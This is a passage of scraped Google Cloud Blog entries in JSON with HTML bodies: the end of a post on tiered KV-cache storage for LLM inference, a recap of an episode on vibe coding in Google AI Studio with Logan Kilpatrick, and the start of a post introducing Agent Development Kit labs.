style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">100000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-3%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+130%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-57%</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p>\u00a0</p>\n<h2><span style=\"vertical-align: baseline; color: #202124;\">Summary</span></h2>\n<p><span style=\"vertical-align: baseline; color: #202124;\">These results clearly demonstrate that a tiered storage solution significantly improves LLM inference performance by leveraging node-local storage, especially in scenarios with long system prompts that generate large KV Caches.</span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"color: #202124;\">Optimizing LLM inference is a complex challenge requiring the coordinated effort of multiple infrastructure components (storage, compute, networking). Our work is part of a broader initiative to enhance the entire end-to-end inference stack, from intelligent load balancing at the</span> </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/about-gke-inference-gateway\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Inference Gateway</span></a><span style=\"vertical-align: baseline;\"> <span style=\"color: #202124;\">to advanced caching logic within the model server.</span></span></p>\n<p><span style=\"vertical-align: baseline; color: #202124;\">We are actively exploring further enhancements by integrating additional remote storage solutions with LMCache.</span></p>\n</div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"LLM Cache on Kubernetes Blog Post\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/LLM_Cache_on_Kubernetes_Blog_Post.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2>Next Steps</h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Get started with the same setup </span><a href=\"https://github.com/vllm-project/production-stack/blob/main/tutorials/cloud_deployments/04-GCP-GKE-lmcache-local-disk.md\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">mentioned above on GKE</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://llm-d.ai/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Keep up to date on the LLM-D Inference Stack</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-07 11:36:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/agent-factory-recap-build-ai-apps-in-minutes-with-googles-logan-kilpatrick/",
        "title": "Agent Factory Recap: Build AI Apps in Minutes with Google's Logan Kilpatrick",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Build-ai-apps-in-minutes-google-ai-studio.max-600x600.png",
        "author": "Smitha Kolan",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In our latest episode of </span><a href=\"https://www.youtube.com/playlist?list=PLIivdWyY5sqLXR1eSkiM5bE6pFlXC-OSs\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">The Agent Factory</span></a><span style=\"vertical-align: baseline;\">, we were thrilled to welcome Logan Kilpatrick from </span><a href=\"https://deepmind.google/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Deep Mind</span></a><span style=\"vertical-align: baseline;\"> for a </span><a href=\"https://cloud.google.com/discover/what-is-vibe-coding?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vibe coding</span></a><span style=\"vertical-align: baseline;\"> session that showcased the tools shaping the future of AI development. Logan, who has had a front-row seat to the generative AI revolution at both OpenAI and now Google, gave us a hands-on tour of the </span><a href=\"https://cloud.google.com/discover/what-is-vibe-coding?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vibe coding</span></a><span style=\"vertical-align: baseline;\"> experience in </span><a href=\"https://aistudio.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\">, showing just how fast you can go from an idea to a fully-functional AI application.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=azvA2Bn2aXw\">\n\n      \n        <img alt=\"A podcast discussing vibe coding in Google AI Studio\" src=\"https://img.youtube.com/vi/azvA2Bn2aXw/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=azvA2Bn2aXw\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This post guides you through the key ideas from our conversation. Use it to quickly recap topics or dive deeper into specific segments with links and timestamps.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The Build Experience in Google AI Studio - What is it?</span></h2>\n<p><span style=\"vertical-align: baseline;\">This episode focused on the </span><a href=\"https://aistudio.google.com/apps\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Build feature</span></a><span style=\"vertical-align: baseline;\"> in </span><a href=\"https://aistudio.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\"> and Logan used the term </span><a href=\"https://cloud.google.com/discover/what-is-vibe-coding?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vibe coding</span></a><span style=\"vertical-align: baseline;\"> to describe the experience of using it. This feature is designed to radically accelerate how developers create </span><a href=\"https://cloud.google.com/discover/ai-applications?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI-powered apps</span></a><span style=\"vertical-align: baseline;\">. The core idea is to move from a natural language prompt of an idea for an app to a live, running application in under a minute. It handles the scaffolding, code generation, and even error correction, allowing you to focus on iterating and refining your idea.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The Factory Floor</span></h2>\n<p><span style=\"vertical-align: baseline;\">The Factory Floor is our segment for getting hands-on. Here, we moved from high-level concepts to practical code with live demos.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Vibe Coding a Virtual Food Photographer</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=-D3tQT9R06KkrdzM&amp;t=74\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">01:14</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">To kick things off, Logan hit the \"I'm Feeling Lucky\" button to generate a random app idea: a virtual food photographer for restaurant owners. The goal was to </span><a href=\"https://aistudio.google.com/apps\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">build</span></a><span style=\"vertical-align: baseline;\"> an app that could:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Accept a simple text-based menu.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Generate realistic, high-end photography for each dish.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Allow for style toggles like \"rustic and dark\" or \"bright and modern.\"</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In about 90 seconds, we had a running web app. Logan fed it a quirky menu of pizza, blueberries, and popcorn, and the app generated images of each. We also saw how you can use AI-suggested features to iteratively adjust the prepared photos\u2014like adding butter to the popcorn, and add functionality\u2014like changing the entire design aesthetic of the site.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"food-photographer-2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/food-photographer-2.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Grounding with Google Maps</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=I7-NVKOnceWz5uUe&amp;t=625\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">10:25</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">Next, Logan showcased one of the most exciting new features: </span><a href=\"https://blog.google/technology/developers/grounding-google-maps-gemini-api/?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">grounding with Google Maps</span></a><span style=\"vertical-align: baseline;\">. This allows the </span><a href=\"https://ai.google.dev/gemini-api/docs/models?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini models</span></a><span style=\"vertical-align: baseline;\"> to connect directly to Google Maps to pull in rich, real-time place data without setting up a separate API. He demonstrated a starter template app that acted as a local guide, finding Italian restaurants in Chicago and describing the neighborhood.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"google-maps-grounding\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/google-maps-grounding.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Exploring the AI Studio Gallery</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=XTNVEE70JsZ-64Gx&amp;t=895\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">14:55</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">For developers looking for inspiration, Logan walked us through the </span><a href=\"https://aistudio.google.com/apps?source=showcase\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Studio Gallery</span></a><span style=\"vertical-align: baseline;\">. This is a collection of pre-built, interactive examples that show what the models are capable of. Two highlights were:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Prompt DJ:</strong><span style=\"vertical-align: baseline;\"> An app that uses the </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/music/generate-music?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Lyria model</span></a><span style=\"vertical-align: baseline;\"> to generate novel, real-time music based on a prompt.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Vibe Check:</strong><span style=\"vertical-align: baseline;\"> A fun tool for visually testing and comparing how different models respond to the same prompt, which is becoming a popular way for developers to quickly evaluate a model's suitability for their use case.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"exploring-AIstudio-gallery\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/exploring-AIstudio-gallery.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">\"Yap to App\": A Conversational Pair Programmer</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=orrbTaI8Hul5UWMu&amp;t=1191\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">19:51</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">For the final demo, Logan used a speech-to-text input to describe an app idea which he called \"Yap to App\". His pitch: an AI pair programmer that could generate HTML code and then vocally coach him on how to improve it. After turning his spoken request into a written prompt, AI Studio built a voice-interactive app. The AI assistant generated a simple HTML card and then, when asked, provided verbal suggestions for improvement.\u00a0</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"yapp-to-app\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/yapp-to-app.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">The Agent Industry Pulse</span></h2>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=0OoxIssx045SIByw&amp;t=1579\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">26:19</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">In this segment, we covered some of the biggest recent launches in the </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">agent</span></a><span style=\"vertical-align: baseline;\"> ecosystem:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://ai.google.dev/gemini-api/docs/video?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Veo 3.1</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Google's new state-of-the-art video generation model that builds on Veo 3, adding richer native audio and the ability to define the first and last frames of a video to generate seamless transitions. Smitha showcased a quick applet, built entirely in AI Studio, where users can upload a selfie of themselves and generate a video of their future career in AI using Veo 3.1.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Anthropic's Skills:</strong><span style=\"vertical-align: baseline;\"> A new feature that allows you to give Claude specific tools (like an Excel script) that it can decide to use on its own to complete a task. We compared this to Gemini Gems, noting the difference in approach between creating a persona (Gem) and providing a tool (Skill).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Recent Google Launches:</strong><span style=\"vertical-align: baseline;\"> Logan highlighted several other key releases, including the new </span><a href=\"https://blog.google/technology/google-deepmind/gemini-computer-use-model/?utm_campaign=CDR_0x6e136736_awareness_b452057599&amp;utm_medium=external&amp;utm_source=youtube\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini computer use model</span></a><span style=\"vertical-align: baseline;\"> for building agents that can navigate browsers, updates to the </span><a href=\"https://ai.google.dev/gemini-api/docs/models?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Flash and Flash-Lite models</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://blog.google/technology/developers/ai-studio-updates-more-control/?utm_campaign=CDR_0x6e136736_awareness_b452057599&amp;utm_medium=external&amp;utm_source=youtube\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">foundational upgrades to the AI Studio experience</span></a><span style=\"vertical-align: baseline;\"> itself.</span></p>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">Logan Kilpatrick on the Future of AI Development</span></h2>\n<p><span style=\"vertical-align: baseline;\">We also had the chance to discuss the bigger picture with Logan, from developer reactions to the future of models themselves.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Grounding with Google Maps</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=oxku5g-tCB3O1oWJ&amp;t=1886\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">31:26</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">When asked which launch developers have been most excited about, Logan admitted he was surprised by the overwhelmingly positive reception for </span><a href=\"https://blog.google/technology/developers/grounding-google-maps-gemini-api/?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">grounding with Google Maps</span></a><span style=\"vertical-align: baseline;\">. He noted that the </span><a href=\"https://mapsplatform.google.com/lp/maps-apis/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Maps API</span></a><span style=\"vertical-align: baseline;\"> is one of the most widely used developer APIs in the world, and making it incredibly simple to integrate with Gemini unlocked key use cases for countless developers and startups.</span></p>\n<h3><span style=\"vertical-align: baseline;\">From Models to Systems: The Next Frontier</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=icS7YYRGOJOHRwes&amp;t=1946\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">32:26</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">Looking ahead, Logan shared his excitement for the continued progress on code generation, which he sees as a fundamental accelerant for all other AI capabilities. He also pointed out a trend: models are evolving from simple tools into complex systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">Historically, a model was something that took a token in and produced a token out. Now, models are starting to look more like </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">agents</span></a><span style=\"vertical-align: baseline;\"> out of the box. They can take actions: spinning up code sandboxes, pinging APIs, and navigating browsers. \"Folks have thought about agents and models as these decoupled concepts,\" Logan said, \"and it feels like they're coming closer and closer together as the model capabilities keep improving.\"</span></p>\n<h2><span style=\"vertical-align: baseline;\">Conclusion</span></h2>\n<p><span style=\"vertical-align: baseline;\">This conversation was a powerful reminder of how quickly the barrier to entry for building sophisticated AI applications is falling. With tools like </span><a href=\"https://aistudio.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\">, the ability to turn a creative spark into a working prototype is no longer a matter of weeks or days, but minutes. The focus is shifting from complex scaffolding to rapid, creative iteration.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Your turn to build</span></h2>\n<p><span style=\"vertical-align: baseline;\">We hope this episode inspired you to get hands-on. Head over to </span><a href=\"https://aistudio.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\"> to try out </span><a href=\"https://cloud.google.com/discover/what-is-vibe-coding?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vibe coding</span></a><span style=\"vertical-align: baseline;\"> for yourself, and don't forget to watch the full episode for all the details.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Connect with us</span></h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Logan </span><span style=\"vertical-align: baseline;\">\u00a0\u2192 </span><a href=\"https://www.linkedin.com/in/logankilpatrick/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/OfficialLoganK\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://bsky.app/profile/officiallogank.bsky.social\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BlueSky</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://logank.ai/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Mollie </span><span style=\"vertical-align: baseline;\">\u00a0\u2192 </span><a href=\"https://www.linkedin.com/in/molliepettit/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, <a href=\"https://x.com/MollzMP\" rel=\"noopener\" target=\"_blank\">X</a>, </span><a href=\"https://bsky.app/profile/mollzmp.bsky.social\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BlueSky</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Smitha \u2192 </span><a href=\"https://www.linkedin.com/in/smithakolan/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.youtube.com/@smithakolan\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">YouTube</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/smithakolan\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.instagram.com/girlknowsai/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Instagram</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-07 10:24:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/build-your-first-adk-agent-workforce/",
        "title": "Build Your First ADK Agent Workforce",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/hero_image___developing_agents.max-600x600.png",
        "author": "Mollie Pettit",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The world of </span><a href=\"https://cloud.google.com/use-cases/generative-ai?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Generative AI</span></a><span style=\"vertical-align: baseline;\"> is evolving rapidly, and </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Agents</span></a><span style=\"vertical-align: baseline;\"> are at the forefront of this change. An AI agent is a software system designed to act on your behalf. They show reasoning, planning, and memory and have a level of autonomy to make decisions, learn, and adapt.</span></p>\n<p><span style=\"vertical-align: baseline;\">At its core, an </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI agent</span></a><span style=\"vertical-align: baseline;\"> uses a </span><a href=\"https://cloud.google.com/ai/llms?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">large language model (LLM)</span></a><span style=\"vertical-align: baseline;\">, like </span><a href=\"https://ai.google.dev/gemini-api/docs/models?utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\">, as its \"brain\" to understand and reason. This allows it to process information from various sources, create a plan, and execute a series of tasks to reach a predefined objective. This is the key difference between a simple prompt-and-response and an agent: the ability to act on a multi-step plan.</span></p>\n<p><span style=\"vertical-align: baseline;\">The great news is that you can now easily build your own </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI agents</span></a><span style=\"vertical-align: baseline;\">, even without deep expertise, thanks to<strong> </strong></span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\">. ADK is an open-source </span><a href=\"https://google.github.io/adk-docs/get-started/python/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Python</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://google.github.io/adk-docs/get-started/java/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Java</span></a><span style=\"vertical-align: baseline;\"> framework by Google designed to simplify agent creation.</span></p>\n<p><span style=\"vertical-align: baseline;\">To guide you, this post introduces three hands-on labs that cover the core patterns of agent development:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Building your first autonomous agent</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Empowering that agent with tools to interact with external services</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Orchestrate a multi-agent system where specialized agents collaborate</span></p>\n</li>\n</ol></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Build your first agent</span></h2>\n<p><span style=\"vertical-align: baseline;\">This lab</span><span style=\"vertical-align: baseline;\"> introduces the foundational principles of </span><a href=\"https://github.com/google/adk-python\" 